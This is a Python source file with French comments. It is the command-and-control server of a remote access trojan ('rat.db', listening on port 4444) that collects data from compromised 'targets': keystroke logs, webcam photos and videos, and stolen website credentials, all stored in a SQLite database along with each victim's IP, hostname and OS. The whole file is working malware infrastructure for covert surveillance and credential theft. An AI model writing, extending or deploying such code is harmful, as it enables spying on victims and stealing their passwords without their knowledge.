import socket
import sqlite3
from datetime import datetime
import json
import os

# Connexion à la base de données
DB_PATH = "../bdd/rat.db"
CAPTURE_DIR = "captures"

# Vérifie et crée le dossier pour sauvegarder les captures
os.makedirs(CAPTURE_DIR, exist_ok=True)

# Connexion à la base de données SQLite
conn = sqlite3.connect(DB_PATH)
cursor = conn.cursor()

# Fonction pour sauvegarder les frappes de clavier
def save_keystroke(target_ip, key_pressed):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        cursor.execute("INSERT INTO keystrokes (timestamp, target_ip, key_pressed) VALUES (?, ?, ?)", 
                       (timestamp, target_ip, key_pressed))
        conn.commit()
        print(f"Keystroke sauvegardée : IP={target_ip}, Key={key_pressed}")
    except Exception as e:
        print(f"Erreur lors de la sauvegarde des keystrokes : {e}")

# Fonction pour sauvegarder une cible dans la table targets
def save_target(ip_address, hostname="unknown", os="unknown"):
    try:
        # Insère ou ignore les doublons (grâce à UNIQUE sur ip_address)
        cursor.execute("""
            INSERT OR IGNORE INTO targets (ip_address, hostname, os)
            VALUES (?, ?, ?)
        """, (ip_address, hostname, os))
        conn.commit()
        print(f"Target sauvegardée : IP={ip_address}, Hostname={hostname}, OS={os}")
    except Exception as e:
        print(f"Erreur lors de la sauvegarde de la cible : {e}")

# Fonction pour sauvegarder les captures de la webcam
def save_webcam_capture(target_ip, file_path):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        cursor.execute("INSERT INTO webcam (timestamp, target_ip, file_path) VALUES (?, ?, ?)", 
                       (timestamp, target_ip, file_path))
        conn.commit()
        print(f"Capture webcam sauvegardée : IP={target_ip}, Fichier={file_path}")
    except Exception as e:
        print(f"Erreur lors de la sauvegarde de la capture webcam : {e}")

# Fonction pour sauvegarder les vidéos dans la base de données
def save_webcam_video(target_ip, file_path):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        cursor.execute("INSERT INTO webcam (timestamp, target_ip, file_path) VALUES (?, ?, ?)", 
                       (timestamp, target_ip, file_path))
        conn.commit()
        print(f"Vidéo webcam sauvegardée : IP={target_ip}, Fichier={file_path}")
    except Exception as e:
        print(f"Erreur lors de la sauvegarde de la vidéo webcam : {e}")


# Fonction pour sauvegarder les mots de passe dans la base de données
def save_passwords(target_ip, passwords):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        for password in passwords:
            cursor.execute("""
                INSERT INTO passwords (target_ip, timestamp, url, username, password)
                VALUES (?, ?, ?, ?, ?)
            """, (target_ip, timestamp, password['url'], password['username'], password['password']))
        conn.commit()
        print(f"Mots de passe sauvegardés pour l'IP : {target_ip}")
    except Exception as e:
        print(f"Erreur lors de la sauvegarde des mots de passe : {e}")

# Fonction pour traiter les données reçues
def process_data(data, client_ip):
    try:
        # Convertir les données JSON
        parsed_data = json.loads(data)
        data_type = parsed_data.get("type")

        # Enregistrer la cible
        hostname = parsed_data.get("hostname", "unknown")
        os_info = parsed_data.get("os", "unknown")
        save_target(client_ip, hostname, os_info)

        # Traiter les différents types de données
        if data_type == "keystroke":
            save_keystroke(client_ip, parsed_data.get("data"))
        
        elif data_type == "webcam_capture":
            filename = parsed_data.get("filename", "capture.jpg")
            img_data = bytes.fromhex(parsed_data.get("data"))
            file_path = os.path.join(CAPTURE_DIR, filename)

            # Sauvegarde du fichier image
            with open(file_path, "wb") as img_file:
                img_file.write(img_data)
            save_webcam_capture(client_ip, file_path)

        elif data_type == "webcam_video":
            filename = parsed_data.get("filename", "video.avi")
            video_data = bytes.fromhex(parsed_data.get("data"))
            file_path = os.path.join(CAPTURE_DIR, filename)

            # Sauvegarde du fichier vidéo
            with open(file_path, "wb") as video_file:
                video_file.write(video_data)
            save_webcam_video(client_ip, file_path)

        # Traitement des mots de passe
        elif data_type == "passwords":
            passwords = parsed_data.get("data", [])
            save_passwords(client_ip, passwords)

        else:
            print(f"Type de données non supporté : {data_type}")
    except Exception as e:
        print(f"Erreur lors du traitement des données : {e}")

# Configuration du serveur
SERVER_HOST = "0.0.0.0"  # Accepte les connexions depuis toutes les interfaces
SERVER_PORT = 4444

# Initialisation du socket serveur
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((SERVER_HOST, SERVER_PORT))
server_socket.listen(5)

print(f"Serveur en écoute sur {SERVER_HOST}:{SERVER_PORT}...")

# Boucle principale pour accepter et traiter les connexions
try:
    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Connexion reçue de {client_address}")
        data = client_socket.recv(1048576).decode('utf-8')  # Augmenter la limite des données reçues
        if data:
            process_data(data, client_address[0])
        client_socket.close()
except KeyboardInterrupt:
    print("\nFermeture du serveur...")
    server_socket.close()
    conn.close()
